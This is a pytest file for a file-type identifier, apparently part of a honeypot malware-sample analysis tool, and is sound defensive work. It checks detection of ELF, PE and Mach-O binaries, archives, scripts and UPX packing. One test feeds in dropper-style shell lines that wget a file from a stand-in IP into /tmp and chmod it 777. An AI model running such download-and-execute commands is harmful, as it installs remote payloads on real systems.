from __future__ import annotations

import struct

from suckerpot_analysis import identify

from .conftest import make_elf, make_pe


def test_elf_x86_64_dynamic_with_symbols() -> None:
    info = identify(make_elf(interp=True, symtab=True))
    assert (info.kind, info.arch, info.bits, info.endian) == ("elf", "x86-64", 64, "little")
    assert info.linking == "dynamic"
    assert info.stripped is False


def test_elf_arm_static_stripped() -> None:
    info = identify(make_elf(machine=40, bits=32))
    assert (info.arch, info.bits, info.linking, info.stripped) == ("arm", 32, "static", True)


def test_elf_mips_big_endian() -> None:
    info = identify(make_elf(machine=8, bits=32, little=False))
    assert (info.arch, info.endian) == ("mips", "big")


def test_elf_machines() -> None:
    for machine, arch in [(183, "aarch64"), (20, "ppc"), (2, "sparc"), (4, "m68k"), (42, "superh")]:
        assert identify(make_elf(machine=machine)).arch == arch


def test_elf_truncated_headers_do_not_raise() -> None:
    full = make_elf(interp=True)
    for cut in range(0, len(full), 7):
        info = identify(full[:cut])
        assert info.kind in {"elf", "data", "text"}


def test_elf_huge_counts_are_capped() -> None:
    data = bytearray(make_elf())
    struct.pack_into("<H", data, 56, 0xFFFF)  # e_phnum
    struct.pack_into("<Q", data, 32, 1 << 62)  # e_phoff far past the end
    info = identify(bytes(data))
    assert info.kind == "elf"
    assert info.linking is None


def test_pe() -> None:
    info = identify(make_pe())
    assert (info.kind, info.arch, info.bits, info.is_dll) == ("pe", "x86-64", 64, False)
    dll = identify(make_pe(machine=0x14C, magic=0x10B, dll=True))
    assert (dll.arch, dll.bits, dll.is_dll) == ("x86", 32, True)


def test_pe_bad_lfanew() -> None:
    data = b"MZ" + b"\x00" * 58 + struct.pack("<I", 0xFFFFFFF0)
    assert identify(data).kind == "data"


def test_macho() -> None:
    data = b"\xcf\xfa\xed\xfe" + struct.pack("<I", 0x0100000C) + b"\x00" * 24
    info = identify(data)
    assert (info.kind, info.arch, info.bits) == ("macho", "aarch64", 64)


def test_archives() -> None:
    assert identify(b"\x1f\x8b\x08" + b"\x00" * 20).kind == "gzip"
    assert identify(b"PK\x03\x04" + b"\x00" * 20).kind == "zip"
    assert identify(b"\xfd7zXZ\x00" + b"\x00" * 20).kind == "xz"
    assert identify(b"7z\xbc\xaf\x27\x1c" + b"\x00" * 20).kind == "7z"
    assert identify(b"BZh9" + b"\x00" * 20).kind == "bzip2"
    assert identify(b"\x00" * 257 + b"ustar" + b"\x00" * 20).kind == "tar"


def test_scripts_and_text() -> None:
    sh = identify(b"#!/bin/sh\nwget http://192.0.2.1/x\n")
    assert (sh.kind, sh.interpreter) == ("script", "sh")
    env = identify(b"#!/usr/bin/env python3\nprint(1)\n")
    assert env.interpreter == "python3"
    assert identify(b"cd /tmp; wget http://192.0.2.1/a; chmod 777 a").kind == "script"
    assert identify(b"hello world, nothing to see here").kind == "text"
    assert identify(bytes(range(256)) * 4).kind == "data"
    assert identify(b"").kind == "data"


def test_upx_marker() -> None:
    packed = make_elf(body=b"\x00" * 64 + b"UPX!" + b"\x00" * 64)
    assert identify(packed).packer == "upx"
    assert identify(make_elf()).packer is None
